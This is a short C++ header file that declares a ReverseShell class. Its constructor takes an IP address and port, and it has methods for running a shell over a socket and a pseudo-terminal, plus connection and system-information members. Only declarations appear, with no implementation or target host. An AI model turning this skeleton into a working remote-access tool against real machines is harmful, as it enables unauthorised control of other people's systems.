#ifndef REVERSE_SHELL_H
#define REVERSE_SHELL_H

#include "Connection.h"
#include "SystemInfo.h"
#include <string>

class ReverseShell {
public:
    ReverseShell(const std::string& ip, int port);
    void run();

private:
    Connection conn;
    SystemInfo sysInfo;
    void handleShell(int sockfd, int pty_fd); // Add sockfd parameter
};

#endif // REVERSE_SHELL_H
